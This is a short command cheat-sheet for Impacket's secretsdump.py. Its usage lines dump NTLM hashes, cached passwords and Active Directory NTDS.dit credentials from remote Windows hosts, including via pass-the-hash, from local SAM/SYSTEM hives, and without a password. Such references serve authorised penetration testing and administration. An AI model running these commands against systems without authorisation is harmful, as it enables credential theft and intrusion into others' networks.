# secretsdump.py

> Dump NTLM hashes, plaintext passwords, and domain credentials from remote Windows systems.
> Part of the Impacket suite.
> More information: <https://github.com/fortra/impacket>.

- Dump credentials from a Windows machine using a username and password:

`secretsdump.py {{domain}}/{{username}}:{{password}}@{{target}}`

- Dump hashes from a machine using pass-the-hash authentication:

`secretsdump.py -hashes {{LM_Hash}}:{{NT_Hash}} {{domain}}/{{username}}@{{target}}`

- Dump credentials from Active Directory’s NTDS.dit file:

`secretsdump.py -just-dc {{domain}}/{{username}}:{{password}}@{{target}}`

- Extract credentials from a local SAM database using registry hives:

`secretsdump.py -sam {{path/to/SAM}} -system {{path/to/SYSTEM}}`

- Dump hashes from a machine without providing a password (if a valid authentication session exists, e.g. via Kerberos or NTLM SSO):

`secretsdump.py -no-pass {{domain}}/{{username}}@{{target}}`
